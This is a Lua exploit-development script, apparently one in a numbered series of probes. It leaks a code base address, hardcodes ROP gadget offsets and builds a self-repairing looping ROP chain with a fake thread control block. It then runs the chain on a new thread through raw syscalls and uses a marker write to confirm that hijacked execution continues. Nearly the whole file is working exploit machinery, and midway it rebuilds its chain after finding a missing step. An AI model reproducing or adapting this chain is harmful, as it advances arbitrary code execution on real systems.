-- CRASH_CLASS: LOW
-- PROBE 395g: infinite loop with failing syscall — fixed stack layout
--
-- ROOT CAUSE of 395d corruption: the stub's error path (push rbp + call __error)
-- writes stack frames DOWNWARD from the stub's position in the chain. In a
-- pop_rsp;ret loop, the frame lands on the loop body, corrupting the gadgets
-- for the next iteration. getpid has no error path → no frame → clean.
--
-- FIX: route the stub call through a DISPOSABLE trampoline in a separate buffer.
-- Before each iteration, repair the trampoline (3 writes). The stub's frame
-- goes into empty space below the trampoline, never touching the loop body.

print("=== PROBE 395g: loop errfix ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function w64(addr, lo, hi)
    wd(addr, lo or 0); wd(addr + 4, hi or 0)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eb=%X_%08X", eb_hi, eb_lo))

local function g(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end
local function g_lohi(off)
    local lo = eb_lo + off; local hi = eb_hi
    if lo >= 0x100000000 then hi = hi + math.floor(lo / 0x100000000); lo = lo % 0x100000000 end
    return lo, hi
end

local pop_rax_ret = g(0x992)
local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D)
local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64)
local mov_rdi_rax = g(0x92C67)
local pop_rsp_ret = g(0x9A2)

-- SIGSYS ignore
local sa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(sa) + i, 0) end
wq(sa, uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Shared memory
local shared = memory.alloc(0x20)
for i = 0, 0x1C, 4 do wd(N(shared) + i, 0) end
local marker_a = N(shared)

-- Fake TCB (zeroed, 64KB, %fs in middle)
local tcb_buf = memory.alloc(0x10000)
for i = 0, 0xFFFC, 4 do wd(N(tcb_buf) + i, 0) end
local tcb_mid = N(tcb_buf) + 0x8000
wd(tcb_mid, tcb_mid % 0x100000000)
wd(tcb_mid + 4, math.floor(tcb_mid / 0x100000000))
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(tcb_mid))

-- DISPOSABLE trampoline: stub call + return to chain
-- Allocated separately with 4KB below for the stub's stack frame
local DISP_SIZE = 0x2000
local disp_buf = memory.alloc(DISP_SIZE)
for i = 0, DISP_SIZE - 4, 4 do wd(N(disp_buf) + i, 0) end
-- Place trampoline at +0x1000 (4KB from bottom = room for stub frame)
local disp_start = N(disp_buf) + 0x1000
print(string.format("disp=%X start=%X", N(disp_buf), disp_start))

-- Main chain stack
local BUF_SIZE = 0x10000
local stk = memory.alloc(BUF_SIZE)
for i = 0, BUF_SIZE - 4, 4 do wd(N(stk) + i, 0) end
local stk_base = N(stk)
local NOMINAL_SIZE = 0x100
local rsp = ((stk_base + NOMINAL_SIZE) - ((stk_base + NOMINAL_SIZE) % 16)) - 8

local sp = rsp
local function push(val) wq(sp, val); sp = sp + 8 end

-- ===== PREAMBLE (runs once) =====
-- sysarch(SET_FSBASE=129)
push(uint64(165))
push(pop_rdi_ret); push(uint64(129))
push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
push(pop_rdx_ret); push(uint64(0))
push(pop_rcx_ret); push(uint64(0))
push(stub)

-- ===== LOOP START =====
local loop_addr = sp

-- Step 1: Repair trampoline[0] = stub address
push(pop_rdi_ret); push(uint64(disp_start))
push(pop_rax_ret); push(stub)
push(mov_rdi_rax)

-- Step 2: Repair trampoline[8] = pop_rsp_ret address
push(pop_rdi_ret); push(uint64(disp_start + 8))
push(pop_rax_ret); push(pop_rsp_ret)
push(mov_rdi_rax)

-- We'll fill trampoline[16] = chain_continue after we know its address
-- For now, push a placeholder — we'll patch it after

-- Step 3: Set syscall args: RAX=6 (close), RDI=-1
push(pop_rax_ret); push(uint64(6))
push(pop_rdi_ret); push(uint64(0xFFFFFFFF))

-- Step 4: Jump to disposable trampoline
push(pop_rsp_ret); push(uint64(disp_start))

-- ===== CHAIN CONTINUE (after stub returns via trampoline) =====
local chain_continue = sp

-- Write marker
push(pop_rdi_ret); push(uint64(marker_a))
push(pop_rax_ret); push(uint64(0xCAFE))
push(mov_rdi_rax)

-- Loop back
push(pop_rsp_ret); push(uint64(loop_addr))

print(string.format("chain=%d bytes, loop=%X, continue=%X", sp - rsp, loop_addr, chain_continue))

-- Now patch: write trampoline[16] = chain_continue (repair step 3 in loop body)
-- We need to insert this repair into the loop body. But we already pushed the chain...
-- Actually, we need to add the repair for trampoline[16] INSIDE the loop body.

-- PROBLEM: We didn't include repair of trampoline[16] in the loop above.
-- Let's rebuild. We know chain_continue now, so let's write a clean version.

-- Reset and rebuild
sp = rsp

-- ===== PREAMBLE (runs once) =====
push(uint64(165))
push(pop_rdi_ret); push(uint64(129))
push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
push(pop_rdx_ret); push(uint64(0))
push(pop_rcx_ret); push(uint64(0))
push(stub)

-- ===== LOOP START =====
loop_addr = sp

-- Repair trampoline[0] = stub
push(pop_rdi_ret); push(uint64(disp_start))
push(pop_rax_ret); push(stub)
push(mov_rdi_rax)

-- Repair trampoline[8] = pop_rsp_ret
push(pop_rdi_ret); push(uint64(disp_start + 8))
push(pop_rax_ret); push(pop_rsp_ret)
push(mov_rdi_rax)

-- Repair trampoline[16] = chain_continue (calculated below)
-- We need forward reference. Trick: the chain_continue offset from loop_addr is fixed.
-- Count gadgets from here to chain_continue:
-- This repair: 5 qwords = 40 bytes
-- Syscall args: 4 qwords = 32 bytes
-- Jump: 2 qwords = 16 bytes
-- Total from here: 40 + 32 + 16 = 88 bytes
-- chain_continue = sp + 88 at this point
-- But sp changes as we push. Let's use a fixed calc:
-- After this repair block (5 pushes), sp = loop_addr + 15*8 + 5*8 = loop_addr + 120 + 40
-- Wait, this is getting messy. Let me just calculate chain_continue as a known offset.

-- From loop_addr:
-- 3 repair blocks × 5 qwords = 15 qwords = 120 bytes
-- syscall args: 4 qwords = 32 bytes
-- jump to disp: 2 qwords = 16 bytes
-- Total = 168 bytes from loop_addr
-- chain_continue = loop_addr + 168

local chain_continue_addr = loop_addr + 168

push(pop_rdi_ret); push(uint64(disp_start + 16))
push(pop_rax_ret); push(uint64(chain_continue_addr))
push(mov_rdi_rax)

-- Set close(-1) args
push(pop_rax_ret); push(uint64(6))
push(pop_rdi_ret); push(uint64(0xFFFFFFFF))

-- Jump to disposable trampoline
push(pop_rsp_ret); push(uint64(disp_start))

-- ===== CHAIN CONTINUE =====
-- Verify our calculation
if sp ~= chain_continue_addr then
    print(string.format("ERROR: sp=%X expected=%X diff=%d", sp, chain_continue_addr, sp - chain_continue_addr))
    return
end

-- Write marker
push(pop_rdi_ret); push(uint64(marker_a))
push(pop_rax_ret); push(uint64(0xCAFE))
push(mov_rdi_rax)

-- Loop back
push(pop_rsp_ret); push(uint64(loop_addr))

print(string.format("chain=%d bytes", sp - rsp))

-- Initialize trampoline (first iteration repair is in the loop, but let's preset)
wq(disp_start, stub)
wq(disp_start + 8, pop_rsp_ret)
wq(disp_start + 16, uint64(chain_continue_addr))

-- thr_param
local pa = memory.alloc(0x38)
for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
local sf_lo, sf_hi = g_lohi(0x992)
w64(N(pa), sf_lo, sf_hi)
w64(N(pa) + 8, 0, 0)
w64(N(pa) + 0x10, stk_base % 0x100000000, math.floor(stk_base / 0x100000000))
w64(N(pa) + 0x18, NOMINAL_SIZE, 0)
local ctid = memory.alloc(8)
w64(N(ctid), 0, 0)
w64(N(pa) + 0x30, N(ctid) % 0x100000000, math.floor(N(ctid) / 0x100000000))

print("launch")
local ok_t, rv_t = pcall(function()
    return mk(455)(uint64(N(pa)), uint64(0x38))
end)
local tret = ok_t and N(rv_t) or -999
print(string.format("thr=%d", tret))
if tret ~= 0 then print("FAIL"); return end
if not alive() then print("DEAD"); return end

local dummy = 0
for i = 1, 500000 do dummy = dummy + 1 end

local m = rd(marker_a)
print(string.format("marker=%04X (expect CAFE)", m or 0))

local tid_lo = rd(N(ctid))
if tid_lo and tid_lo > 0 then
    local ok_k, rv_k = pcall(function()
        return mk(433)(uint64(tid_lo), uint64(0))
    end)
    print(string.format("thr_kill=%d (0=alive)", ok_k and N(rv_k) or -999))
end

print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 395g COMPLETE ===")
